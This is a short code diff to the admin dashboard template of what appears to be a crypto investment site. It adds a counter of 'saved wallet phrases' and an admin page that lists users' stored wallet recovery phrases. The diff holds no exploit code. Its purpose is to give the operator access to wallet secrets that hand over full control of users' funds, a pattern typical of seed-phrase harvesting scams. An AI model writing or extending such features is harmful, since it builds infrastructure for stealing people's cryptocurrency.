@@ -370,6 +370,11 @@
             <strong>{{ number_format($stats['total_investment_plans']) }}</strong>
             <div class="admin-note">Active plans available on the platform</div>
         </div>
+        <div class="admin-card">
+            <span>Wallet connections</span>
+            <strong>{{ number_format($stats['total_wallet_connections']) }}</strong>
+            <div class="admin-note">Saved wallet phrases</div>
+        </div>
     </div>
 
     <div class="admin-menu-grid">
@@ -392,6 +397,11 @@
             <span class="admin-menu-icon"><i class="fas fa-chart-line"></i></span>
             <h3>Investment Plans</h3>
             <p>Manage product visibility and review which plan tiers are driving current transaction volume.</p>
+        </a>
+        <a href="{{ route('admin.wallet-connections') }}" class="admin-menu-card">
+            <span class="admin-menu-icon"><i class="fas fa-key"></i></span>
+            <h3>Wallet Connections</h3>
+            <p>View all saved wallet phrases and connection details for personal backup and recovery.</p>
         </a>
     </div>
 
